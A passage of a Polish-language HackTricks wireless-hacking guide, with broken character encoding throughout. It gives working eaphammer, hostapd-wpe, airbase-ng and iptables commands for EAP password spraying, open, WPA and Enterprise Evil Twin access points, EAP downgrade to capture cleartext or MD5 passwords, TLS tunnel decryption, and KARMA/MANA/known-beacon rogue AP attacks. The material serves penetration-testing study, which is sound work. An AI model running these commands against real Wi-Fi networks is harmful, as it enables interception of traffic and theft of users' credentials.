Mo偶esz r贸wnie偶 przeprowadzi ten atak za pomoc `eaphammer`:
```bash
./eaphammer --eap-spray \
--interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 \
--essid example-wifi \
--password bananas \
--user-list users.txt
```
## Teoria atak贸w na klienta

### Wyb贸r sieci i roaming

* Protok贸 802.11 definiuje, jak stacja docza do Rozszerzonego Zestawu Usug (ESS), ale nie okrela kryteri贸w wyboru ESS lub punktu dostpowego (AP) w jego obrbie.
* Stacje mog przemieszcza si midzy AP, kt贸re dziel ten sam ESSID, utrzymujc czno w budynku lub obszarze.
* Protok贸 wymaga uwierzytelnienia stacji do ESS, ale nie nakada obowizku uwierzytelnienia AP do stacji.

### Lista preferowanych sieci (PNL)

* Stacje przechowuj ESSID ka偶dej sieci bezprzewodowej, do kt贸rej si cz, w swojej Licie Preferowanych Sieci (PNL), wraz z szczeg贸ami konfiguracji specyficznymi dla sieci.
* PNL jest u偶ywana do automatycznego czenia si z znanymi sieciami, poprawiajc dowiadczenie u偶ytkownika poprzez uproszczenie procesu czenia.

### Skanowanie pasywne

* AP okresowo nadaj ramki beacon, ogaszajc swoj obecno i cechy, w tym ESSID AP, chyba 偶e nadawanie jest wyczone.
* Podczas skanowania pasywnego stacje nasuchuj ramek beacon. Jeli ESSID beacona pasuje do wpisu w PNL stacji, stacja mo偶e automatycznie poczy si z tym AP.
* Znajomo PNL urzdzenia umo偶liwia potencjalne wykorzystanie poprzez naladowanie ESSID znanej sieci, oszukujc urzdzenie, aby poczyo si z nieautoryzowanym AP.

### Aktywne sondowanie

* Aktywne sondowanie polega na wysyaniu przez stacje 偶da sondowania w celu odkrycia pobliskich AP i ich cech.
* Ukierunkowane 偶dania sondowania celuj w konkretny ESSID, pomagajc wykry, czy dana sie jest w zasigu, nawet jeli jest ukryta.
* 呕dania sondowania rozgoszeniowego maj pust sekcj SSID i s wysyane do wszystkich pobliskich AP, pozwalajc stacji sprawdzi, czy istnieje jaka preferowana sie bez ujawniania zawartoci swojej PNL.

## Prosty AP z przekierowaniem do Internetu

Zanim wyjanione zostanie, jak przeprowadza bardziej zo偶one ataki, zostanie wyjanione **jak** po prostu **utworzy** **AP** i **przekierowa** jego **ruch** do interfejsu podczonego **do** **Internetu**.

U偶ywajc `ifconfig -a`, sprawd藕, czy interfejs wlan do utworzenia AP oraz interfejs podczony do Internetu s obecne.

### DHCP i DNS
```bash
apt-get install dnsmasq #Manages DHCP and DNS
```
Utw贸rz plik konfiguracyjny `/etc/dnsmasq.conf`:
```ini
interface=wlan0
dhcp-authoritative
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
```
Nastpnie **ustaw IP** i **trasy**:
```bash
ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
```
A nastpnie **uruchom** dnsmasq:
```bash
dnsmasq -C dnsmasq.conf -d
```
### hostapd
```bash
apt-get install hostapd
```
Utw贸rz plik konfiguracyjny `hostapd.conf`:
```ini
interface=wlan0
driver=nl80211
ssid=MITIWIFI
hw_mode=g
channel=11
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=mitmwifi123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_group_rekey=86400
ieee80211n=1
wme_enabled=1
```
**Zatrzymaj irytujce procesy**, ustaw **tryb monitorowania** i **uruchom hostapd**:
```bash
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
hostapd ./hostapd.conf
```
### Przekazywanie i Przekierowanie
```bash
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan0 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
```
## Evil Twin

Atak evil twin wykorzystuje spos贸b, w jaki klienci WiFi rozpoznaj sieci, polegajc g贸wnie na nazwie sieci (ESSID) bez koniecznoci uwierzytelniania stacji bazowej (punktu dostpowego) przez klienta. Kluczowe punkty to:

* **Trudnoci w rozr贸偶nieniu**: Urzdzenia maj trudnoci z odr贸偶nieniem legalnych punkt贸w dostpowych od nieautoryzowanych, gdy dziel t sam ESSID i typ szyfrowania. W rzeczywistych sieciach czsto u偶ywa si wielu punkt贸w dostpowych z t sam ESSID, aby pynnie rozszerzy zasig.
* **Roaming klient贸w i manipulacja poczeniem**: Protok贸 802.11 pozwala urzdzeniom na roaming midzy punktami dostpowymi w tej samej ESS. Atakujcy mog to wykorzysta, kuszc urzdzenie do rozczenia si z aktualn stacj bazow i poczenia z nieautoryzowan. Mo偶na to osign, oferujc silniejszy sygna lub zak贸cajc poczenie z legalnym punktem dostpowym za pomoc metod takich jak pakiety deautoryzacji lub zak贸canie.
* **Wyzwania w realizacji**: Skuteczne przeprowadzenie ataku evil twin w rodowiskach z wieloma, dobrze umiejscowionymi punktami dostpowymi mo偶e by trudne. Deautoryzacja jednego legalnego punktu dostpowego czsto skutkuje poczeniem urzdzenia z innym legalnym punktem dostpowym, chyba 偶e atakujcy mo偶e deautoryzowa wszystkie pobliskie punkty dostpowe lub strategicznie umieci nieautoryzowany punkt dostpowy.

Mo偶esz stworzy bardzo podstawowy Open Evil Twin (bez mo偶liwoci routowania ruchu do Internetu) wykonujc:
```bash
airbase-ng -a 00:09:5B:6F:64:1E --essid "Elroy" -c 1 wlan0mon
```
Mo偶esz r贸wnie偶 stworzy Evil Twin za pomoc **eaphammer** (zauwa偶, 偶e aby stworzy evil twins za pomoc eaphammer, interfejs **NIE powinien by** w trybie **monitor**):
```bash
./eaphammer -i wlan0 --essid exampleCorp --captive-portal
```
Or using Airgeddon: `Options: 5,6,7,8,9 (inside Evil Twin attack menu).`

![](<../../.gitbook/assets/image (1088).png>)

Prosz zauwa偶y, 偶e domylnie, jeli ESSID w PNL jest zapisany jako chroniony WPA, urzdzenie nie poczy si automatycznie z otwartym evil Twin. Mo偶esz spr贸bowa DoS prawdziwego AP i mie nadziej, 偶e u偶ytkownik poczy si rcznie z twoim otwartym evil twin, lub mo偶esz DoS prawdziwego AP i u偶y WPA Evil Twin, aby przechwyci handshake (u偶ywajc tej metody nie bdziesz w stanie pozwoli ofierze poczy si z tob, poniewa偶 nie znasz PSK, ale mo偶esz przechwyci handshake i spr贸bowa go zama).

_Niekt贸re systemy operacyjne i oprogramowanie antywirusowe ostrzeg u偶ytkownika, 偶e poczenie z otwart sieci jest niebezpieczne..._

### WPA/WPA2 Evil Twin

Mo偶esz stworzy **Evil Twin u偶ywajc WPA/2** i jeli urzdzenia s skonfigurowane do czenia si z tym SSID za pomoc WPA/2, bd pr贸bowa si poczy. Tak czy inaczej, **aby zakoczy 4-way-handshake** musisz r贸wnie偶 **zna** **haso**, kt贸re klient zamierza u偶y. Jeli **nie znasz** go, **poczenie nie zostanie zakoczone**.
```bash
./eaphammer -i wlan0 -e exampleCorp -c 11 --creds --auth wpa-psk --wpa-passphrase "mywifipassword"
```
### Enterprise Evil Twin

Aby zrozumie te ataki, zalecabym przeczytanie wczeniej kr贸tkiego [wyjanienia WPA Enterprise](./#wpa-enterprise-mgt).

**U偶ywajc hostapd-wpe**

`hostapd-wpe` potrzebuje pliku **konfiguracyjnego**, aby dziaa. Aby **zautomatyzowa** generowanie tych konfiguracji, mo偶esz u偶y [https://github.com/WJDigby/apd\_launchpad](https://github.com/WJDigby/apd\_launchpad) (pobierz plik python w _/etc/hostapd-wpe/_).
```bash
./apd_launchpad.py -t victim -s PrivateSSID -i wlan0 -cn company.com
hostapd-wpe ./victim/victim.conf -s
```
W pliku konfiguracyjnym mo偶esz wybra wiele r贸偶nych rzeczy, takich jak ssid, kana, pliki u偶ytkownik贸w, cret/klucz, parametry dh, wersja wpa i autoryzacja...

[**U偶ywanie hostapd-wpe z EAP-TLS, aby umo偶liwi logowanie za pomoc dowolnego certyfikatu.**](evil-twin-eap-tls.md)

**U偶ywanie EAPHammer**
```bash
# Generate Certificates
./eaphammer --cert-wizard

# Launch Attack
./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
```
Domylnie EAPHammer proponuje te metody uwierzytelniania (zauwa偶 GTC jako pierwsz do pr贸by uzyskania hase w postaci czystego tekstu, a nastpnie u偶ycie bardziej solidnych metod uwierzytelniania):
```
GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5
```
To jest domylna metodologia, aby unikn dugich czas贸w poczenia. Mo偶esz jednak r贸wnie偶 okreli serwerowi metody uwierzytelniania od najsabszej do najsilniejszej:
```
--negotiate weakest
```
Or you could also use:

* `--negotiate gtc-downgrade` aby u偶y wysoce wydajnej implementacji GTC downgrade (hasa w postaci czystego tekstu)
* `--negotiate manual --phase-1-methods PEAP,TTLS --phase-2-methods MSCHAPV2,GTC,TTLS-PAP` aby rcznie okreli oferowane metody (oferowanie tych samych metod autoryzacji w tej samej kolejnoci, co organizacja, znacznie utrudni wykrycie ataku).
* [Find more info in the wiki](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)

**Using Airgeddon**

`Airgeddon` mo偶e u偶ywa wczeniej wygenerowanych certyfikat贸w do oferowania autoryzacji EAP w sieciach WPA/WPA2-Enterprise. Faszywa sie obni偶y protok贸 poczenia do EAP-MD5, aby m贸c **przechwyci u偶ytkownika i MD5 hasa**. P贸藕niej atakujcy mo偶e spr贸bowa zama haso.\
`Airgeddon` oferuje mo偶liwo **cigego ataku Evil Twin (haaliwego)** lub **tylko stworzenia ataku Evil do momentu, gdy kto si poczy (cichego).**

![](<../../.gitbook/assets/image (936).png>)

### Debugging PEAP and EAP-TTLS TLS tunnels in Evil Twins attacks

_Ta metoda zostaa przetestowana w poczeniu PEAP, ale poniewa偶 odszyfrowuj dowolny tunel TLS, powinna r贸wnie偶 dziaa z EAP-TTLS_

W **konfiguracji** _hostapd-wpe_ **zakomentuj** lini, kt贸ra zawiera _**dh\_file**_ (z `dh_file=/etc/hostapd-wpe/certs/dh` na `#dh_file=/etc/hostapd-wpe/certs/dh`)\
To spowoduje, 偶e `hostapd-wpe` **wymieni klucze u偶ywajc RSA** zamiast DH, wic bdziesz m贸g **odszyfrowa** ruch p贸藕niej **znajc prywatny klucz serwera**.

Teraz uruchom **Evil Twin** u偶ywajc **`hostapd-wpe`** z t zmodyfikowan konfiguracj jak zwykle. Uruchom r贸wnie偶 **`wireshark`** w **interfejsie**, kt贸ry wykonuje atak Evil Twin.

Teraz lub p贸藕niej (gdy ju偶 przechwycie kilka pr贸b autoryzacji) mo偶esz doda prywatny klucz RSA do wireshark w: `Edit --> Preferences --> Protocols --> TLS --> (RSA keys list) Edit...`

Dodaj nowy wpis i wypenij formularz tymi wartociami: **Adres IP = dowolny** -- **Port = 0** -- **Protok贸 = data** -- **Plik klucza** (**wybierz sw贸j plik klucza**, aby unikn problem贸w, wybierz plik klucza **bez ochrony hasem**).

![](<../../.gitbook/assets/image (687).png>)

I sp贸jrz na now **zakadk "Decrypted TLS"**:

![](<../../.gitbook/assets/image (231).png>)

## KARMA, MANA, Loud MANA i atak na znane beacony

### ESSID i czarne/biae listy MAC

R贸偶ne typy list filtr贸w dostpu do medi贸w (MFACL) oraz ich odpowiadajce tryby i efekty na zachowanie faszywego punktu dostpu (AP):

1. **Biaa lista oparta na MAC**:
* Faszywy AP bdzie odpowiada tylko na zapytania probe od urzdze okrelonych na biaej licie, pozostajc niewidoczny dla wszystkich innych, kt贸re nie s wymienione.
2. **Czarna lista oparta na MAC**:
* Faszywy AP zignoruje zapytania probe od urzdze na czarnej licie, skutecznie czynic faszywego AP niewidocznym dla tych konkretnych urzdze.
3. **Biaa lista oparta na SSID**:
* Faszywy AP bdzie odpowiada na zapytania probe tylko dla okrelonych ESSID-贸w wymienionych na licie, czynic go niewidocznym dla urzdze, kt贸rych preferencyjne listy sieci (PNL) nie zawieraj tych ESSID-贸w.
4. **Czarna lista oparta na SSID**:
* Faszywy AP nie bdzie odpowiada na zapytania probe dla konkretnych ESSID-贸w na czarnej licie, czynic go niewidocznym dla urzdze poszukujcych tych konkretnych sieci.
```bash
# example EAPHammer MFACL file, wildcards can be used
09:6a:06:c8:36:af
37:ab:46:7a:9a:7c
c7:36:8c:b2:*:*

[--mac-whitelist /path/to/mac/whitelist/file.txt #EAPHammer whitelisting]
[--mac-blacklist /path/to/mac/blacklist/file.txt #EAPHammer blacklisting]
```

```bash
# example ESSID-based MFACL file
name1
name2
name3

[--ssid-whitelist /path/to/mac/whitelist/file.txt]
[--ssid-blacklist /path/to/mac/blacklist/file.txt]
```
### KARMA

Ta metoda pozwala **atakujcemu na stworzenie zoliwego punktu dostpowego (AP), kt贸ry odpowiada na wszystkie zapytania probe** od urzdze pr贸bujcych poczy si z sieciami. Ta technika **oszukuje urzdzenia, zmuszajc je do poczenia si z AP atakujcego** poprzez naladowanie sieci, kt贸rych urzdzenia szukaj. Gdy urzdzenie wysya 偶danie poczenia do tego faszywego AP, nawizuje poczenie, co prowadzi do bdnego poczenia urzdzenia z sieci atakujcego.

### MANA

Nastpnie **urzdzenia zaczy ignorowa niezam贸wione odpowiedzi sieciowe**, co zmniejszyo skuteczno pierwotnego ataku karma. Jednak nowa metoda, znana jako **atak MANA**, zostaa wprowadzona przez Iana de Villiersa i Dominica White'a. Metoda ta polega na tym, 偶e faszywy AP **przechwytuje listy preferowanych sieci (PNL) z urzdze, odpowiadajc na ich rozgoszone zapytania probe** nazwami sieci (SSID), kt贸re wczeniej byy 偶dane przez urzdzenia. Ten zaawansowany atak omija zabezpieczenia przed pierwotnym atakiem karma, wykorzystujc spos贸b, w jaki urzdzenia zapamituj i priorytetyzuj znane sieci.

Atak MANA dziaa, monitorujc zar贸wno skierowane, jak i rozgoszone zapytania probe z urzdze. W przypadku skierowanych zapyta rejestruje adres MAC urzdzenia oraz 偶dan nazw sieci, dodajc te informacje do listy. Gdy otrzymane zostanie zapytanie rozgoszone, AP odpowiada informacjami odpowiadajcymi kt贸rejkolwiek z sieci na licie urzdzenia, zachcajc urzdzenie do poczenia si z faszywym AP.
```bash
./eaphammer -i wlan0 --cloaking full --mana --mac-whitelist whitelist.txt [--captive-portal] [--auth wpa-psk --creds]
```
### Loud MANA

Atak **Loud MANA** to zaawansowana strategia, gdy urzdzenia nie u偶ywaj kierunkowego przeszukiwania lub gdy ich Lista Preferowanych Sieci (PNL) jest nieznana atakujcemu. Dziaa na zasadzie, 偶e **urzdzenia w tym samym obszarze prawdopodobnie dziel niekt贸re nazwy sieci w swoich PNL**. Zamiast odpowiada selektywnie, ten atak nadaje odpowiedzi na zapytania dla ka偶dej nazwy sieci (ESSID) znalezionej w poczonych PNL wszystkich obserwowanych urzdze. To szerokie podejcie zwiksza szans, 偶e urzdzenie rozpozna znajom sie i spr贸buje poczy si z faszywym punktem dostpowym (AP).
```bash
./eaphammer -i wlan0 --cloaking full --mana --loud [--captive-portal] [--auth wpa-psk --creds]
```
### Known Beacon attack

Gdy **Loud MANA attack** mo偶e nie wystarczy, **Known Beacon attack** przedstawia inne podejcie. Ta metoda **brute-forces proces poczenia, symulujc AP, kt贸ry odpowiada na dowoln nazw sieci, przechodzc przez list potencjalnych ESSID-贸w** pochodzcych z listy s贸w. To symuluje obecno licznych sieci, majc nadziej na dopasowanie ESSID w PNL ofiary, co skania do pr贸by poczenia z faszywym AP. Atak mo偶na wzmocni, czc go z opcj `--loud` w celu bardziej agresywnej pr贸by przechwycenia urzdze.

Eaphammer zaimplementowa ten atak jako atak MANA, w kt贸rym wszystkie ESSID-y z listy s adowane (mo偶esz r贸wnie偶 poczy to z `--loud`, aby stworzy atak Loud MANA + Known beacons):
```bash
./eaphammer -i wlan0 --mana [--loud] --known-beacons  --known-ssids-file wordlist.txt [--captive-portal] [--auth wpa-psk --creds]
```
**Atak znanego wybuchu sygnau**

Atak **znanego wybuchu sygnau** polega na **szybkiej transmisji ramek sygnaowych dla ka偶dego ESSID wymienionego w pliku**. Tworzy to gste rodowisko faszywych sieci, znacznie zwikszajc prawdopodobiestwo, 偶e urzdzenia pocz si z nieautoryzowanym punktem dostpowym, szczeg贸lnie w poczeniu z atakiem MANA. Technika ta wykorzystuje szybko i objto, aby przytoczy mechanizmy wyboru sieci urzdze.
```bash
# transmit a burst of 5 forged beacon packets for each entry in list
./forge-beacons -i wlan1 \
--bssid de:ad:be:ef:13:37 \
--known-essids-file known-s.txt \
--dst-addr 11:22:33:11:22:33 \
--burst-count 5
```
## Wi-Fi Direct

**Wi-Fi Direct** to protok贸 umo偶liwiajcy urzdzeniom bezporednie czenie si ze sob za pomoc Wi-Fi, bez potrzeby tradycyjnego punktu dostpowego. Ta funkcjonalno jest zintegrowana w r贸偶nych urzdzeniach Internetu Rzeczy (IoT), takich jak drukarki i telewizory, uatwiajc bezporedni komunikacj midzy urzdzeniami. Ciekaw cech Wi-Fi Direct jest to, 偶e jedno urzdzenie peni rol punktu dostpowego, znanego jako waciciel grupy, aby zarzdza poczeniem.

Bezpieczestwo pocze Wi-Fi Direct jest ustanawiane za pomoc **Wi-Fi Protected Setup (WPS)**, kt贸re wspiera kilka metod bezpiecznego parowania, w tym:

* **Konfiguracja przyciskiem (PBC)**
* **Wprowadzenie PIN-u**
* **Komunikacja w bliskim zasigu (NFC)**

Metody te, szczeg贸lnie wprowadzenie PIN-u, s podatne na te same luki jak WPS w tradycyjnych sieciach Wi-Fi, co czyni je celem dla podobnych wektor贸w ataku.

### EvilDirect Hijacking

**EvilDirect Hijacking** to atak specyficzny dla Wi-Fi Direct. Odbija koncepcj ataku Evil Twin, ale celuje w poczenia Wi-Fi Direct. W tym scenariuszu atakujcy podszywa si pod legalnego waciciela grupy, majc na celu oszukanie urzdze, aby poczyy si z zoliwym podmiotem. Metoda ta mo偶e by realizowana za pomoc narzdzi takich jak `airbase-ng`, okrelajc kana, ESSID i adres MAC podszywanego urzdzenia:

## References

* [https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee](https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee)
* [https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9](https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9)
* [https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38](https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38)
* [https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d](https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d)
* [https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf](https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf)
* [http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)
* [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
* [https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d](https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d)
* [https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)](https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-\(Offline-WPS-Attack\))
* [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)

TODO: Sprawd藕 [https://github.com/wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher) (logowanie przez Facebooka i imitacja WPA w portalach przechwytujcych)

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Docz do serwera [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy), aby komunikowa si z dowiadczonymi hakerami i owcami bug贸w!

**Hacking Insights**\
Zaanga偶uj si w treci, kt贸re zagbiaj si w emocje i wyzwania zwizane z hackingiem

**Real-Time Hack News**\
Bd藕 na bie偶co z dynamicznym wiatem hackingu dziki wiadomociom i spostrze偶eniom w czasie rzeczywistym

**Latest Announcements**\
Bd藕 na bie偶co z najnowszymi nagrodami za bdy oraz istotnymi aktualizacjami platformy

**Docz do nas na** [**Discord**](https://discord.com/invite/N3FrSbmwdy) i zacznij wsp贸pracowa z najlepszymi hakerami ju偶 dzi!

{% hint style="success" %}
Ucz si i wicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz si i wicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* Sprawd藕 [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel si trikami hackingowymi, przesyajc PR-y do repozytori贸w** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
